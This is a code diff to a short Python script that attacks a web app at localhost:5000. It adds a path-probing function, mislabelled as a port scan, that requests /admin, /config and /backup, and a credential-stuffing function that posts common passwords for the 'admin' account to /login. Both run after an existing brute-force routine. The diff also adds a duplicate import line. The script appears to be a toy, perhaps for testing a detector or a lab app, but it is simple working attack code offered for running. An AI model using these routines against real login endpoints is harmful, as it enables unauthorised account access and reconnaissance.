@@ -1,7 +1,9 @@
 import requests
+import requests
 import time
 
 TARGET = "http://127.0.0.1:5000"
+
 
 def brute_force():
 
@@ -21,5 +23,33 @@ def brute_force():
         time.sleep(1)
 
 
+def port_scan():
+
+    print("Starting port scan...")
+
+    endpoints = ["/admin", "/config", "/backup"]
+
+    for ep in endpoints:
+        response = requests.get(f"{TARGET}{ep}")
+        print("Scan:", ep, response.status_code)
+
+
+def credential_stuffing():
+
+    print("Starting credential stuffing...")
+
+    passwords = ["admin", "password", "123456"]
+
+    for p in passwords:
+        response = requests.post(
+            f"{TARGET}/login",
+            data={"username": "admin", "password": p}
+        )
+
+        print("Attempt:", p, response.json())
+
+
 if __name__ == "__main__":
     brute_force()
+    port_scan()
+    credential_stuffing()
